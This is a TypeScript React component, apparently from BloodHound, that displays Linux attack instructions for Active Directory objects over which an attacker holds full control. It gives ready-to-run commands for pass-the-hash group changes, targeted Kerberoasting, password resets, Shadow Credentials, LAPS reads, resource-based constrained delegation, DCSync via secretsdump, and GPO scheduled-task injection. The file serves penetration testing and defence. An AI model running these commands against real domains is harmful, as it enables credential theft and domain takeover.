// Copyright 2023 Specter Ops, Inc.
//
// Licensed under the Apache License, Version 2.0
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

import { Link } from '@mui/material';
import { Typography } from 'doodle-ui';
import { FC } from 'react';
import { AdcsEsc14ScenarioALinux } from '../AdcsEsc14ScenarioA';
import { EdgeInfoProps } from '../index';

const LinuxAbuse: FC<EdgeInfoProps & { targetId: string; haslaps: boolean }> = ({
    sourceName,
    targetName,
    targetType,
    haslaps,
}) => {
    switch (targetType) {
        case 'Group':
            return (
                <>
                    <Typography variant='body2'>
                        Full control of a group allows you to directly modify group membership of the group.
                    </Typography>

                    <Typography variant='body2'>
                        Use samba's net tool to add the user to the target group. The credentials can be supplied in
                        cleartext or prompted interactively if omitted from the command line:
                    </Typography>

                    <Typography component={'pre'}>
                        {
                            'net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'
                        }
                    </Typography>

                    <Typography variant='body2'>
                        It can also be done with pass-the-hash using{' '}
                        <Link
                            target='_blank'
                            rel='noopener noreferrer'
                            href='https://github.com/byt3bl33d3r/pth-toolkit'>
                            pth-toolkit's net tool
                        </Link>
                        . If the LM hash is not known, use 'ffffffffffffffffffffffffffffffff'.
                    </Typography>

                    <Typography component={'pre'}>
                        {
                            'pth-net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"'
                        }
                    </Typography>

                    <Typography variant='body2'>
                        Finally, verify that the user was successfully added to the group:
                    </Typography>

                    <Typography component={'pre'}>
                        {
                            'net rpc group members "TargetGroup" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'
                        }
                    </Typography>
                </>
            );
        case 'User':
            return (
                <>
                    <Typography variant='body2'>
                        Full control of a user allows you to modify properties of the user to perform a targeted
                        kerberoast attack, and also grants the ability to reset the password of the user without knowing
                        their current one.
                    </Typography>

                    <Typography variant='body1'> Targeted Kerberoast </Typography>

                    <Typography variant='body2'>
                        A targeted kerberoast attack can be performed using{' '}
                        <Link
                            target='_blank'
                            rel='noopener noreferrer'
                            href='https://github.com/ShutdownRepo/targetedKerberoast'>
                            targetedKerberoast.py
                        </Link>
                        .
                    </Typography>

                    <Typography component={'pre'}>
                        {"targetedKerberoast.py -v -d 'domain.local' -u 'controlledUser' -p 'ItsPassword'"}
                    </Typography>

                    <Typography variant='body2'>
                        The tool will automatically attempt a targetedKerberoast attack, either on all users or against
                        a specific one if specified in the command line, and then obtain a crackable hash. The cleanup
                        is done automatically as well.
                    </Typography>

                    <Typography variant='body2'>
                        The recovered hash can be cracked offline using the tool of your choice.
                    </Typography>

                    <Typography variant='body1'> Force Change Password </Typography>

                    <Typography variant='body2'>
                        Use samba's net tool to change the user's password. The credentials can be supplied in cleartext
                        or prompted interactively if omitted from the command line. The new password will be prompted if
                        omitted from the command line.
                    </Typography>

                    <Typography component={'pre'}>
                        {
                            'net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'
                        }
                    </Typography>

                    <Typography variant='body2'>
                        It can also be done with pass-the-hash using{' '}
                        <Link
                            target='_blank'
                            rel='noopener noreferrer'
                            href='https://github.com/byt3bl33d3r/pth-toolkit'>
                            pth-toolkit's net tool
                        </Link>
                        . If the LM hash is not known, use 'ffffffffffffffffffffffffffffffff'.
                    </Typography>

                    <Typography component={'pre'}>
                        {
                            'pth-net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"'
                        }
                    </Typography>
                    <Typography variant='body2'>
                        Now that you know the target user's plain text password, you can either start a new agent as
                        that user, or use that user's credentials in conjunction with PowerView's ACL abuse functions,
                        or perhaps even RDP to a system the target user has access to. For more ideas and information,
                        see the references tab.
                    </Typography>

                    <Typography variant='body1'> Shadow Credentials attack </Typography>

                    <Typography variant='body2'>
                        To abuse this permission, use{' '}
                        <Link
                            target='_blank'
                            rel='noopener noreferrer'
                            href='https://github.com/ShutdownRepo/pywhisker'>
                            pyWhisker
                        </Link>
                        .
                    </Typography>

                    <Typography component={'pre'}>
                        {
                            'pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"'
                        }
                    </Typography>

                    <Typography variant='body2'>
                        For other optional parameters, view the pyWhisker documentation.
                    </Typography>
                    <AdcsEsc14ScenarioALinux />
                </>
            );
        case 'Computer':
            if (haslaps) {
                return (
                    <>
                        <Typography variant='body1'> Retrieve LAPS Password </Typography>
                        <Typography variant='body2'>
                            Full control of a computer object is abusable when the computer's local admin account
                            credential is controlled with LAPS.
                        </Typography>
                        <Typography variant='body2'>
                            For systems using legacy LAPS, the following AD computer object properties are relevant:
                            <br />
                            <b>- ms-Mcs-AdmPwd</b>: The plaintext LAPS password
                            <br />
                            <b>- ms-Mcs-AdmPwdExpirationTime</b>: The LAPS password expiration time
                            <br />
                        </Typography>
                        <Typography variant='body2'>
                            For systems using Windows LAPS (2023 edition), the following AD computer object properties
                            are relevant:
                            <br />
                            <b>- msLAPS-Password</b>: The plaintext LAPS password
                            <br />
                            <b>- msLAPS-PasswordExpirationTime</b>: The LAPS password expiration time
                            <br />
                            <b>- msLAPS-EncryptedPassword</b>: The encrypted LAPS password
                            <br />
                            <b>- msLAPS-EncryptedPasswordHistory</b>: The encrypted LAPS password history
                            <br />
                            <b>- msLAPS-EncryptedDSRMPassword</b>: The encrypted Directory Services Restore Mode (DSRM)
                            password
                            <br />
                            <b>- msLAPS-EncryptedDSRMPasswordHistory</b>: The encrypted DSRM password history
                            <br />
                        </Typography>
                        <Typography variant='body2'>
                            Plaintext attributes can be read using a simple LDAP client. For example, with bloodyAD:
                        </Typography>
                        <Typography component={'pre'}>
                            {
                                "bloodyAD --host $DC_IP -d $DOMAIN -u $USER -p $PASSWORD get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime"
                            }
                        </Typography>
                        <Typography variant='body2'>
                            See Windows abuse for retrieving and decrypting the encrypted attributes.
                        </Typography>
                        <Typography variant='body1'> Resource-Based Constrained Delegation </Typography>
                        First, if an attacker does not control an account with an SPN set, a new attacker-controlled
                        computer account can be added with Impacket's addcomputer.py example script:
                        <Typography component={'pre'}>
                            {
                                "addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host $DomainController -domain-netbios $DOMAIN 'domain/user:password'"
                            }
                        </Typography>
                        We now need to configure the target object so that the attacker-controlled computer can delegate
                        to it. Impacket's rbcd.py script can be used for that purpose:
                        <Typography component={'pre'}>
                            {
                                "rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'TargetComputer' -action 'write' 'domain/user:password'"
                            }
                        </Typography>
                        And finally we can get a service ticket for the service name (sname) we want to "pretend" to be
                        "admin" for. Impacket's getST.py example script can be used for that purpose.
                        <Typography component={'pre'}>
                            {
                                "getST.py -spn 'cifs/targetcomputer.testlab.local' -impersonate 'admin' 'domain/attackersystem$:Summer2018!'"
                            }
                        </Typography>
                        This ticket can then be used with Pass-the-Ticket, and could grant access to the file system of
                        the TARGETCOMPUTER.
                        <Typography variant='body1'> Resource-Based Constrained Delegation </Typography>
                        <Typography variant='body2'>
                            First, if an attacker does not control an account with an SPN set, a new attacker-controlled
                            computer account can be added with Impacket's addcomputer.py example script:
                        </Typography>
                        <Typography component={'pre'}>
                            {
                                "addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host $DomainController -domain-netbios $DOMAIN 'domain/user:password'"
                            }
                        </Typography>
                        <Typography variant='body2'>
                            We now need to configure the target object so that the attacker-controlled computer can
                            delegate to it. Impacket's rbcd.py script can be used for that purpose:
                        </Typography>
                        <Typography component={'pre'}>
                            {
                                "rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'TargetComputer' -action 'write' 'domain/user:password'"
                            }
                        </Typography>
                        <Typography variant='body2'>
                            And finally we can get a service ticket for the service name (sname) we want to "pretend" to
                            be "admin" for. Impacket's getST.py example script can be used for that purpose.
                        </Typography>
                        <Typography component={'pre'}>
                            {
                                "getST.py -spn 'cifs/targetcomputer.testlab.local' -impersonate 'admin' 'domain/attackersystem$:Summer2018!'"
                            }
                        </Typography>
                        <Typography variant='body2'>
                            This ticket can then be used with Pass-the-Ticket, and could grant access to the file system
                            of the TARGETCOMPUTER.
                        </Typography>
                        <Typography variant='body1'> Shadow Credentials attack </Typography>
                        <Typography variant='body2'>
                            To abuse this permission, use{' '}
                            <Link
                                target='_blank'
                                rel='noopener noreferrer'
                                href='https://github.com/ShutdownRepo/pywhisker'>
                                pyWhisker
                            </Link>
                            .
                        </Typography>
                        <Typography component={'pre'}>
                            {
                                'pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"'
                            }
                        </Typography>
                        <Typography variant='body2'>
                            For other optional parameters, view the pyWhisker documentation.
                        </Typography>
                        <AdcsEsc14ScenarioALinux />
                    </>
                );
            } else {
                return (
                    <>
                        <Typography variant='body1'> Resource-Based Constrained Delegation </Typography>
                        <Typography variant='body2'>
                            First, if an attacker does not control an account with an SPN set, a new attacker-controlled
                            computer account can be added with Impacket's addcomputer.py example script:
                        </Typography>
                        <Typography component={'pre'}>
                            {
                                "addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host $DomainController -domain-netbios $DOMAIN 'domain/user:password'"
                            }
                        </Typography>
                        <Typography variant='body2'>
                            We now need to configure the target object so that the attacker-controlled computer can
                            delegate to it. Impacket's rbcd.py script can be used for that purpose:
                        </Typography>
                        <Typography component={'pre'}>
                            {
                                "rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'TargetComputer' -action 'write' 'domain/user:password'"
                            }
                        </Typography>
                        <Typography variant='body2'>
                            And finally we can get a service ticket for the service name (sname) we want to "pretend" to
                            be "admin" for. Impacket's getST.py example script can be used for that purpose.
                        </Typography>
                        <Typography component={'pre'}>
                            {
                                "getST.py -spn 'cifs/targetcomputer.testlab.local' -impersonate 'admin' 'domain/attackersystem$:Summer2018!'"
                            }
                        </Typography>
                        <Typography variant='body2'>
                            This ticket can then be used with Pass-the-Ticket, and could grant access to the file system
                            of the TARGETCOMPUTER.
                        </Typography>
                        <Typography variant='body1'> Shadow Credentials attack </Typography>
                        <Typography variant='body2'>
                            To abuse this permission, use{' '}
                            <Link
                                target='_blank'
                                rel='noopener noreferrer'
                                href='https://github.com/ShutdownRepo/pywhisker'>
                                pyWhisker
                            </Link>
                            .
                        </Typography>
                        <Typography component={'pre'}>
                            {
                                'pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"'
                            }
                        </Typography>
                        <Typography variant='body2'>
                            For other optional parameters, view the pyWhisker documentation.
                        </Typography>
                        <AdcsEsc14ScenarioALinux />
                    </>
                );
            }
        case 'Domain':
            return (
                <>
                    <Typography variant='body1'> DCSync </Typography>

                    <Typography variant='body2'>
                        The AllExtendedRights permission grants {sourceName} both the DS-Replication-Get-Changes and
                        DS-Replication-Get-Changes-All permission, which combined allow a principal to replicate objects
                        from the domain {targetName}.
                    </Typography>

                    <Typography variant='body2'>
                        This can be abused using Impacket's secretsdump.py example script:
                    </Typography>

                    <Typography component={'pre'}>
                        {"secretsdump 'DOMAIN'/'USER':'PASSWORD'@'DOMAINCONTROLLER'"}
                    </Typography>

                    <Typography variant='body1'>Generic Descendent Object Takeover</Typography>
                    <Typography variant='body2'>
                        The simplest and most straight forward way to obtain control of the objects of the domain is to
                        apply a GenericAll ACE on the domain that will inherit down to all object types. This can be
                        done using Impacket's dacledit (cf. "grant rights" reference for the link).
                    </Typography>

                    <Typography component={'pre'}>
                        {
                            "dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'JKHOLER' -target-dn 'DomainDistinguishedName' 'domain'/'user':'password'"
                        }
                    </Typography>

                    <Typography variant='body2'>
                        Now, the "JKOHLER" user will have full control of all descendent objects of each type.
                    </Typography>

                    <Typography variant='body1'>Objects for which ACL inheritance is disabled</Typography>

                    <Typography variant='body2'>
                        The compromise vector described above relies on ACL inheritance and will not work for objects
                        with ACL inheritance disabled, such as objects protected by AdminSDHolder (attribute
                        adminCount=1). This observation applies to any user or computer with inheritance disabled,
                        including objects located in nested OUs.
                    </Typography>

                    <Typography variant='body2'>
                        In this situation, GenericAll on the domain object may still be exploitable through gPLink.
                        GenericAll allows you to modify the domain's gPLink attribute, which can be abused to link a
                        malicious Group Policy Object (GPO) to the domain. The linked GPO applies to the domain's users
                        and computers, including those in nested OUs, and can force those child objects to execute
                        arbitrary commands, for example through an immediate scheduled task.
                    </Typography>

                    <Typography variant='body2'>
                        If you do not control an existing GPO and cannot create one, exploitation requires the ability
                        to create machine accounts and add DNS records that do not already exist in the domain. An
                        already compromised domain-joined machine can also be used. Executing this attack vector is not
                        trivial and requires setup.
                    </Typography>

                    <Typography variant='body2'>
                        From Linux, you can use the{' '}
                        <Link target='_blank' rel='noopener noreferrer' href='https://github.com/synacktiv/OUned'>
                            OUned.py
                        </Link>{' '}
                        tool to exploit this gPLink manipulation path. For requirements and implementation details, see{' '}
                        <Link
                            target='_blank'
                            rel='noopener noreferrer'
                            href='https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory'>
                            the accompanying OUned.py article
                        </Link>
                        .
                    </Typography>
                    <Typography variant='body2'>
                        If you control an existing GPO or can create one, the attack is simpler: inject a malicious
                        configuration, such as an immediate scheduled task, into a controlled GPO, then link that GPO to
                        the target domain object through its gPLink attribute. You can use{' '}
                        <Link
                            target='_blank'
                            rel='noopener noreferrer'
                            href='https://github.com/synacktiv/GroupPolicyBackdoor'>
                            GroupPolicyBackdoor.py
                        </Link>{' '}
                        for this. For example, first inject the malicious configuration with the 'inject' command.
                    </Typography>
                    <Typography component={'pre'}>
                        {
                            'python3 gpb.py gpo inject -d "corp.com" --dc "dc.corp.com" -u "user" -p "password" -m Scheduled_task_add.ini -n "TARGETGPO"'
                        }
                    </Typography>
                    <Typography variant='body2'>
                        Then link the modified GPO to the domain with the 'link' command.
                    </Typography>
                    <Typography component={'pre'}>
                        {
                            'python3 gpb.py links link -d "corp.com" --dc "dc.corp.com" -u "user" -p "password" -o "DC=corp,DC=com" -n "TARGETGPO"'
                        }
                    </Typography>

                    <Typography variant='body2'>
                        Consider how many users and computers the target domain contains; each affected object will
                        attempt to retrieve and apply the malicious GPO.
                    </Typography>
                </>
            );
        case 'GPO':
            return (
                <>
                    <Typography variant='body2'>
                        GenericAll on a GPO allows you to modify that GPO and inject malicious configuration. For
                        example, you can add an immediate scheduled task that runs on the computers or users that
                        process the GPO, compromising those objects. Some settings, including scheduled tasks, support
                        item-level targeting, which can limit execution to specific objects. GPOs apply every 90 minutes
                        for standard objects (with a random offset of 0 to 30 minutes), and every 5 minutes for domain
                        controllers. See the References tab for more detail.
                    </Typography>

                    <Typography variant='body2'>
                        The{' '}
                        <Link
                            target='_blank'
                            rel='noopener noreferrer'
                            href='https://github.com/synacktiv/GroupPolicyBackdoor'>
                            GroupPolicyBackdoor.py
                        </Link>{' '}
                        tool can perform the attack from Linux. First, define a module file that describes the
                        configuration to inject. The example below defines a computer configuration with an immediate
                        scheduled task that adds a domain user as a local administrator. The filter limits the
                        configuration to a specific target.
                    </Typography>

                    <Typography component={'pre'}>
                        {'[MODULECONFIG]\n' +
                            'name = Scheduled Tasks\n' +
                            'type = computer\n' +
                            '\n' +
                            '[MODULEOPTIONS]\n' +
                            'task_type = immediate\n' +
                            'program = cmd.exe\n' +
                            'arguments = /c "net localgroup Administrators corp.com\\john /add"\n' +
                            '\n' +
                            '[MODULEFILTERS]\n' +
                            'filters = [{ "operator": "AND", "type": "Computer Name", "value": "srv1.corp.com"}]'}
                    </Typography>

                    <Typography variant='body2'>
                        Save this configuration as Scheduled_task_add.ini, then inject it into the target GPO with the
                        'inject' command.
                    </Typography>
                    <Typography component={'pre'}>
                        {
                            'python3 gpb.py gpo inject -d "corp.com" --dc "dc.corp.com" -u "user" -p "password" -m Scheduled_task_add.ini -n "TARGETGPO"'
                        }
                    </Typography>

                    <Typography variant='body2'>
                        Alternatively,{' '}
                        <Link target='_blank' rel='noopener noreferrer' href='https://github.com/Hackndo/pyGPOAbuse'>
                            pyGPOAbuse.py
                        </Link>{' '}
                        can also be used for this purpose.
                    </Typography>
                </>
            );
        case 'OU':
            return (
                <>
                    <Typography variant='body1'>Control of the Organization Unit</Typography>

                    <Typography variant='body2'>
                        With full control of the OU, you may add a new ACE on the OU that will inherit down to the
                        objects under that OU. Below are two options depending on how targeted you choose to be in this
                        step:
                    </Typography>

                    <Typography variant='body1'>Generic Descendent Object Takeover</Typography>
                    <Typography variant='body2'>
                        The simplest and most straight forward way to abuse control of the OU is to apply a GenericAll
                        ACE on the OU that will inherit down to all object types. This can be done using Impacket's
                        dacledit (cf. "grant rights" reference for the link).
                    </Typography>

                    <Typography component={'pre'}>
                        {
                            "dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'JKHOLER' -target-dn 'OUDistinguishedName' 'domain'/'user':'password'"
                        }
                    </Typography>

                    <Typography variant='body2'>
                        Now, the "JKOHLER" user will have full control of all descendent objects of each type.
                    </Typography>

                    <Typography variant='body1'>Targeted Descendent Object Takeoever</Typography>

                    <Typography variant='body2'>
                        If you want to be more targeted with your approach, it is possible to specify precisely what
                        right you want to apply to precisely which kinds of descendent objects. Refer to the Windows
                        Abuse info for this.
                    </Typography>

                    <Typography variant='body1'>Objects for which ACL inheritance is disabled</Typography>

                    <Typography variant='body2'>
                        The compromise vector described above relies on ACL inheritance and will not work for objects
                        with ACL inheritance disabled, such as objects protected by AdminSDHolder (attribute
                        adminCount=1). This observation applies to any user or computer with inheritance disabled,
                        including objects located in nested OUs.
                    </Typography>

                    <Typography variant='body2'>
                        In this situation, GenericAll on the OU may still be exploitable through gPLink. GenericAll
                        allows you to modify the OU's gPLink attribute, which can be abused to link a malicious Group
                        Policy Object (GPO) to the OU. The linked GPO applies to the OU's users and computers, including
                        those in nested OUs, and can force those child objects to execute arbitrary commands, for
                        example through an immediate scheduled task.
                    </Typography>

                    <Typography variant='body2'>
                        If you do not control an existing GPO and cannot create one, exploitation requires the ability
                        to create machine accounts and add DNS records that do not already exist in the domain. An
                        already compromised domain-joined machine can also be used. Executing this attack vector is not
                        trivial and requires setup.
                    </Typography>

                    <Typography variant='body2'>
                        From Linux, you can use the{' '}
                        <Link target='_blank' rel='noopener noreferrer' href='https://github.com/synacktiv/OUned'>
                            OUned.py
                        </Link>{' '}
                        tool to exploit this gPLink manipulation path. For requirements and implementation details, see{' '}
                        <Link
                            target='_blank'
                            rel='noopener noreferrer'
                            href='https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory'>
                            the accompanying OUned.py article
                        </Link>
                        .
                    </Typography>
                    <Typography variant='body2'>
                        If you control an existing GPO or can create one, the attack is simpler: inject a malicious
                        configuration, such as an immediate scheduled task, into a controlled GPO, then link that GPO to
                        the target OU through its gPLink attribute. You can use{' '}
                        <Link
                            target='_blank'
                            rel='noopener noreferrer'
                            href='https://github.com/synacktiv/GroupPolicyBackdoor'>
                            GroupPolicyBackdoor.py
                        </Link>{' '}
                        for this. For example, first inject the malicious configuration with the 'inject' command.
                    </Typography>
                    <Typography component={'pre'}>
                        {
                            'python3 gpb.py gpo inject -d "corp.com" --dc "dc.corp.com" -u "user" -p "password" -m Scheduled_task_add.ini -n "TARGETGPO"'
                        }
                    </Typography>
                    <Typography variant='body2'>
                        Then link the modified GPO to the OU with the 'link' command.
                    </Typography>
                    <Typography component={'pre'}>
                        {
                            'python3 gpb.py links link -d "corp.com" --dc "dc.corp.com" -u "user" -p "password" -o "OU=SERVERS,DC=corp,DC=com" -n "TARGETGPO"'
                        }
                    </Typography>

                    <Typography variant='body2'>
                        Consider how many users and computers the target OU contains; each affected object will attempt
                        to retrieve and apply the malicious GPO.
                    </Typography>
                </>
            );
        case 'Container':
            return (
                <>
                    <Typography variant='body1'>Control of the Container</Typography>

                    <Typography variant='body2'>
                        With full control of the container, you may add a new ACE on the container that will inherit
                        down to the objects under that OU. Below are two options depending on how targeted you choose to
                        be in this step:
                    </Typography>

                    <Typography variant='body1'>Generic Descendent Object Takeover</Typography>
                    <Typography variant='body2'>
                        The simplest and most straight forward way to abuse control of the OU is to apply a GenericAll
                        ACE on the OU that will inherit down to all object types. This can be done using Impacket's
                        dacledit (cf. "grant rights" reference for the link).
                    </Typography>

                    <Typography component={'pre'}>
                        {
                            "dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'JKHOLER' -target-dn 'containerDistinguishedName' 'domain'/'user':'password'"
                        }
                    </Typography>

                    <Typography variant='body2'>
                        Now, the "JKOHLER" user will have full control of all descendent objects of each type.
                    </Typography>

                    <Typography variant='body1'>Targeted Descendent Object Takeoever</Typography>

                    <Typography variant='body2'>
                        If you want to be more targeted with your approach, it is possible to specify precisely what
                        right you want to apply to precisely which kinds of descendent objects. Refer to the Windows
                        Abuse info for this.
                    </Typography>
                </>
            );
        case 'CertTemplate':
            return (
                <>
                    <Typography variant='body2'>
                        With GenericAll permission over a certificate template, you may be able to perform an ESC4
                        attack by modifying the template's attributes. BloodHound will in that case create an ADCSESC4
                        edge from the principal to the forest domain node.
                    </Typography>
                </>
            );
        case 'EnterpriseCA':
            return (
                <>
                    <Typography variant='body2'>
                        With GenericAll permission over an enterprise CA, you can publish certificate templates to the
                        enterprise CA by adding the CN name of the template in the enterprise CA object's
                        certificateTemplates attribute. This action may enable you to perform an ADCS domain escalation.
                    </Typography>
                </>
            );
        case 'RootCA':
            return (
                <>
                    <Typography variant='body2'>
                        With GenericAll permission over a root CA, you can make a rogue certificate trusted as a root CA
                        in the AD forest by adding the certificate in the root CA object's cACertificate attribute. This
                        action may enable you to perform an ADCS domain escalation.
                    </Typography>
                </>
            );
        case 'NTAuthStore':
            return (
                <>
                    <Typography variant='body2'>
                        With GenericAll permission over a NTAuth store, you can make an enterprise CA certificate
                        trusted for NT (domain) authentication in the AD forest by adding the certificate in the root CA
                        object's cACertificate attribute. This action may enable you to perform an ADCS domain
                        escalation.
                    </Typography>
                </>
            );
        case 'IssuancePolicy':
            return (
                <>
                    <Typography variant='body2'>
                        With GenericAll permission over an issuance policy object, you create a OID group link to a
                        targeted group by adding the group's distinguishedName in the msDS-OIDToGroupLink attribute of
                        the issuance policy object. This action may enable you to gain membership of the group through
                        an ADCS ESC13 attack.
                    </Typography>
                </>
            );
        case 'Site':
            return (
                <>
                    <Typography variant='body2'>
                        GenericAll permissions on a site object allow you to modify its gPLink attribute. A malicious
                        Group Policy Object (GPO) linked to the site can force affected computers and users to execute
                        arbitrary commands, for example through an immediate scheduled task.
                    </Typography>
                    <Typography variant='body2'>
                        For site objects, affected computers include the site's domain controllers, and also computers
                        whose IP addresses fall within one of the site's subnets. If the site is the default site,
                        affected computers also include computers that do not map to any other site. Affected users are
                        those who sign in to the affected computers.
                    </Typography>

                    <Typography variant='body2'>
                        If you do not control an existing GPO and cannot create one, exploitation requires the ability
                        to create machine accounts and add DNS records that do not already exist in the domain. An
                        already compromised domain-joined machine can also be used. Executing this attack vector is not
                        trivial and requires setup.
                    </Typography>

                    <Typography variant='body2'>
                        From Linux, see{' '}
                        <Link
                            target='_blank'
                            rel='noopener noreferrer'
                            href='https://www.synacktiv.com/publications/site-unseen-enumerating-and-attacking-active-directory-sites'>
                            the Site Unseen article
                        </Link>{' '}
                        for site-specific gPLink attack requirements and implementation details.
                    </Typography>

                    <Typography variant='body2'>
                        If you control an existing GPO or can create one, the attack is simpler: inject a malicious
                        configuration, such as an immediate scheduled task, into a controlled GPO, then link that GPO to
                        the target site object through its gPLink attribute. You can use{' '}
                        <Link
                            target='_blank'
                            rel='noopener noreferrer'
                            href='https://github.com/synacktiv/GroupPolicyBackdoor'>
                            GroupPolicyBackdoor.py
                        </Link>{' '}
                        for this. For example, first inject the malicious configuration with the 'inject' command.
                    </Typography>
                    <Typography component={'pre'}>
                        {
                            'python3 gpb.py gpo inject -d "corp.com" --dc "dc.corp.com" -u "user" -p "password" -m Scheduled_task_add.ini -n "TARGETGPO"'
                        }
                    </Typography>
                    <Typography variant='body2'>
                        Then link the modified GPO to the site object with the 'link' command.
                    </Typography>
                    <Typography component={'pre'}>
                        {
                            'python3 gpb.py links link -d "corp.com" --dc "dc.corp.com" -u "user" -p "password" -o "CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=corp,DC=com" -n "TARGETGPO"'
                        }
                    </Typography>

                    <Typography variant='body2'>
                        Consider how many computers and users the target site affects; each affected object will attempt
                        to retrieve and apply the malicious GPO.
                    </Typography>
                </>
            );

        default:
            return (
                <>
                    <Typography variant='body2'>No abuse information available for this node type.</Typography>
                </>
            );
    }
};

export default LinuxAbuse;
